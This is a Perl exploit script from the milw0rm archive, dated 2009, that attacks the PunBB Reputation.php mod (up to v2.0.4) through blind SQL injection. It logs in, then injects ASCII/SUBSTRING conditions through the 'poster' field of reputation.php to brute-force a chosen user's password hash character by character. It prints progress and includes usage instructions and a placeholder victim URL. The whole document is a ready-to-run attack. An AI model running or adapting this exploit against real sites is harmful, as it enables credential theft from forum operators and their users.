<html><head><title>PunBB Reputation.php Mod <= 2.0.4 Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#[0-Day] PunBB Reputation.php Mod &lt;= v2.0.4 Remote Blind SQL Injection Exploit
#Coded By Dante90, WaRWolFz Crew
#Bug Discovered By: Dante90, WaRWolFz Crew

use strict;
use LWP::UserAgent;
use HTTP::Cookies;

use HTTP::Request::Common;
use Time::HiRes;
use IO::Socket;

my ($UserName,$PassWord,$ID) = @ARGV;
if(@ARGV &lt; 3){
    &amp;usage();
    exit();
}
my $Message = &quot;&quot;;
my ($Hash,$Time,$Time_Start,$Time_End,$Response);
my($Start,$End);
my @chars = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
my $Host = &quot;http://www.victime_site.org/path/&quot;; #Insert Victime Web Site Link
my $Method = HTTP::Request-&gt;new(POST =&gt; $Host);
my $Cookies = new HTTP::Cookies;
my $HTTP = new LWP::UserAgent(
            agent =&gt; 'Mozilla/5.0',
            max_redirect =&gt; 0,
            cookie_jar =&gt; $Cookies,
        ) or die $!;
my $Referrer = &quot;form_sent=1&amp;pid=10174&amp;poster=Dante90, WaRWolFz Crew&amp;method=1&amp;req_message=http://www.warwolfz.com/&amp;submit=Invia&quot;;
my $DefaultTime = request($Referrer);

sub Login(){
    my $Login = $HTTP-&gt;post($Host.'login.php?action=in',
                [
                    form_sent        =&gt; '1',
                    redirect_url    =&gt; 'forums.php',
                    req_username    =&gt; $UserName,
                    req_password    =&gt; $PassWord,
                    login =&gt; 'Login',
                ]) || die $!;

    if($Login-&gt;content =~ /Logged in successfully./i){
        return 1;
    }else{
        return 0;
    }
}
if (Login() == 1){
    $Message = &quot; * Logged in as: &quot;.$UserName;
}elsif (Login() == 0){
    $Message = &quot; * Login Failed.&quot;;
    refresh($Message, $Host, $DefaultTime, &quot;0&quot;, $Hash, $Time, &quot;1&quot;);
    print &quot; * Exploit Failed                                     *\n&quot;;
    print &quot; ------------------------------------------------------ \n&quot;;
    exit;
}

sub Blind_SQL_Jnjection{
    my ($dec,$hex) = @_;
    return &quot;Dante90, WaRWolFz Crew\&quot; OR ASCII(SUBSTRING((SELECT `password` FROM `users` WHERE `id`=${ID}),${dec},1))=${hex}/*&quot;;
}

for(my $I=1; $I&lt;=40; $I++){ #N Hash characters
    for(my $J=0; $J&lt;=15; $J++){ #0 -&gt; F
        my $Post = $HTTP-&gt;post($Host.'reputation.php?',[
                    form_sent    =&gt; '1',
                    pid            =&gt; '2',
                    poster        =&gt; Blind_SQL_Jnjection($I,$chars[$J]),
                    method        =&gt; '1',
                    req_message    =&gt; 'http://www.warwolfz.com/',
                    submit        =&gt; 'Submit',
                ]) || die $!;
        $Time = request($Referrer);
        refresh($Message, $Host, $DefaultTime, $J, $Hash, $Time, $I);
        if($Post-&gt;content =~ /(The reputation has been successfully changed)/i){
            syswrite(STDOUT,chr($chars[$J]));
            $Hash .= chr($chars[$J]);
            $Time = request($Referrer);
            refresh($Message, $Host, $DefaultTime, $J, $Hash, $Time, $I);
            last;
        }
    }
    if($I == 1 &amp;&amp; length $Hash &lt; 1 &amp;&amp; !$Hash){
        print &quot; * Exploit Failed                                     *\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
        exit;
    }
    if($I == 40){
        print &quot; * Exploit Successed                                  *\n&quot;;
        print &quot; ------------------------------------------------------\n &quot;;
        system(&quot;pause&quot;);
    }
}

sub usage{
    system(&quot;cls&quot;);
    {
        print &quot; \n [0-Day] PunBB Reputation.php Mod &lt;= v2.0.4 Remote Blind SQL Injection Exploit\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
        print &quot; * USAGE:                                             *\n&quot;;
        print &quot; * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n&quot;;
        print &quot; * perl name_exploit.pl [username] [password] [id]    *\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
        print &quot; *         Powered By Dante90, WaRWolFz Crew          *\n&quot;;
        print &quot; * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
    };
    exit;
}

sub request{
    $Referrer = $_[0];
    $Method-&gt;content_type('application/x-www-form-urlencoded');
    $Method-&gt;content($Referrer);
    $Start = Time::HiRes::time();
    $Response = $HTTP-&gt;request($Method);
    $Response-&gt;is_success() or die &quot;$Host : &quot;, $Response-&gt;message,&quot;\n&quot;;
    $End = Time::HiRes::time();
    $Time = $End - $Start;
    return $Time;
}

sub refresh{
    system(&quot;cls&quot;);
    {
        print &quot; \n [0-Day] PunBB Reputation.php Mod &lt;= v2.0.4 Remote Blind SQL Injection Exploit\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
        print &quot; * USAGE:                                             *\n&quot;;
        print &quot; * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n&quot;;
        print &quot; * perl name_exploit.pl [username] [password] [id]    *\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
        print &quot; *         Powered By Dante90, WaRWolFz Crew          *\n&quot;;
        print &quot; * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n&quot;;
        print &quot; ------------------------------------------------------ \n&quot;;
    };
    print $_[0] .&quot;\n&quot;;
    print &quot; * Victime Site: &quot; . $_[1] . &quot;\n&quot;;
    print &quot; * Default Time: &quot; . $_[2] . &quot; seconds\n&quot;;
    print &quot; * BruteForcing Hash: &quot; . chr($chars[$_[3]]) . &quot;\n&quot;;
    print &quot; * BruteForcing N Char Hash: &quot; . $_[6] . &quot;\n&quot;;
    print &quot; * SQL Time: &quot; . $_[5] . &quot; seconds\n&quot;;
    print &quot; * Hash: &quot; . $_[4] . &quot;\n&quot;;
}

#WaRWolFz Crew

# milw0rm.com [2009-07-28]</pre></html>